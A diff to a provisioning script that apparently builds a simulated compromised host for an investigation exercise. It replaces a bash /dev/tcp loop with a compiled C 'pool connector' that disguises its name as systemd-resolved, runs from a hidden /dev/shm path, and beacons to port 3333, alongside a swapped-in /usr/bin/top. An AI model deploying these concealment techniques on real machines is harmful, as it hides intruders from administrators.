@@ -152,20 +152,54 @@ provision:
       cp /tmp/top_wrapper.sh /usr/bin/top
       chmod +x /usr/bin/top
       
-      # Create fake mining pool connection
-      # In reality, this would connect to a mining pool
-      # We'll simulate with a background process
-      cat > /tmp/pool_connect.sh << 'POOL_EOF'
-      #!/bin/bash
-      while true; do
-          # Simulate connection to mining pool
-          timeout 30 bash -c 'exec 3<>/dev/tcp/198.51.100.50/3333 2>/dev/null || true'
-          sleep 60
-      done
-      POOL_EOF
+      # Create fake mining pool connection that shows up in lsof
+      cat > /tmp/pool_connector.c << 'POOL_C_EOF'
+      #include <stdio.h>
+      #include <stdlib.h>
+      #include <string.h>
+      #include <unistd.h>
+      #include <sys/socket.h>
+      #include <netinet/in.h>
+      #include <arpa/inet.h>
+      #include <sys/prctl.h>
       
-      chmod +x /tmp/pool_connect.sh
-      nohup /tmp/pool_connect.sh > /dev/null 2>&1 &
+      int main() {
+          prctl(PR_SET_NAME, "systemd-resolved", 0, 0, 0);
+          
+          while(1) {
+              int sock = socket(AF_INET, SOCK_STREAM, 0);
+              if (sock < 0) {
+                  sleep(60);
+                  continue;
+              }
+              
+              struct sockaddr_in server;
+              server.sin_family = AF_INET;
+              server.sin_port = htons(3333);
+              // Use a real public DNS server IP that won't respond on port 3333
+              inet_pton(AF_INET, "8.8.8.8", &server.sin_addr);
+              
+              // Try to connect (will timeout/fail but shows in lsof during attempt)
+              struct timeval timeout;
+              timeout.tv_sec = 30;
+              timeout.tv_usec = 0;
+              setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+              setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
+              
+              connect(sock, (struct sockaddr*)&server, sizeof(server));
+              
+              // Keep socket open for a bit so it shows in lsof
+              sleep(45);
+              close(sock);
+              sleep(15);
+          }
+          return 0;
+      }
+      POOL_C_EOF
+      
+      gcc -o /dev/shm/.config/pool-connector /tmp/pool_connector.c
+      rm /tmp/pool_connector.c
+      nohup /dev/shm/.config/pool-connector > /dev/null 2>&1 &
       
       echo "Cryptominer installed - system compromised"
 
